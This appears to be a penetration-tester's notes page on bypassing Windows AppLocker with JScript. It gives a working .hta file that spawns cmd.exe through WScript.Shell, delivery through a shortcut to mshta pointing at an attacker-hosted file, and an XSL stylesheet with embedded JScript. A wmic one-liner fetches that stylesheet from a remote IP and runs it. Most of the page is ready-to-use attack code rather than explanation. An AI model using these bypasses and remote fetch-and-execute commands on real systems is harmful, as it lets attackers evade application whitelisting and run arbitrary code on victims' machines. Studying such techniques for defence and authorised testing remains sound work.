---
layout:     post
author:     0x5c4r3
type: docs
permalink: Applocker_Bypass_JScript
---

<span style="font-size: 35px; color:red"><b>Applocker Bypass with JScript</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>MSHTA</b></span>
We'll abuse <span style="color:red">Microsoft HTML Applications</span> (MSHTA) running an .hta file.

Simple hta file:
```html
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

To run it:
```shell
mshta C:\Tools\test.hta
```

To deliver it, you can createa shortcut. To create the shortcut file, we'll right-click the desktop on the Windows 10 victim machine and navigate to _New_ -> _Shortcut_. In the new window, we'll enter the MSHTA executable path <span style="color:red">(C:\Windows\System32\mshta.exe)</span> followed by the URL of the .hta file on our Kali machine
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>XSL Transform</b></span>
The process of XSLT uses <span style="color:red">Extensible Stylesheet Language</span> (.xsl) documents to transform an XML document into a different format such as <span style="color:red">XHTML</span>.
XSL file (test.xsl):
```xml
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell"); 'payload here
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```

Download and run like so:
```shell
wmic process get brief /format:"http://<IP>/test.xsl"
```
